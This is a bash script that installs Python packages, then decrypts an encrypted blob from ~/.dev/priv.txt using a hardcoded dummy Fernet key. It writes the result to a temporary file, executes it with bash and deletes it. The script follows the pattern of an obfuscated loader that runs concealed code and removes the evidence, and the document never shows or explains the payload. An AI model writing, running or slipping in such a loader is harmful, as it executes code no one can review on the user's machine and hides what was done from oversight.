#!/bin/bash

if ! python3 -c "import requests" &> /dev/null; then
    pip3 install requests
fi

if ! python3 -c "import cryptography" &> /dev/null; then
    pip3 install cryptography
fi

TEMP_SCRIPT=$(mktemp)

python3 - << EOF
from cryptography.fernet import Fernet
import sys
import os

none = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='
cipher_suite = Fernet(none)

env_file = os.path.expanduser('~/.dev/priv.txt')

try:
    with open(env_file, 'r') as f:
        content = f.read()

    import re
    match = re.search(r'priv1=(.*?)(?:\n\w+\=|$)', content, re.DOTALL)
    if match:
        encrypted_data = match.group(1).replace('\n', '').strip().encode()

        decrypted_data = cipher_suite.decrypt(encrypted_data)

        with open('${TEMP_SCRIPT}', 'w') as f:
            f.write(decrypted_data.decode())
    else:
        sys.exit(1)
except Exception as e:
    import traceback
    traceback.print_exc()
    sys.exit(1)
EOF

if [ $? -eq 0 ]; then
    bash "$TEMP_SCRIPT"

    rm -f "$TEMP_SCRIPT"
else
    rm -f "$TEMP_SCRIPT"
    exit 1
fi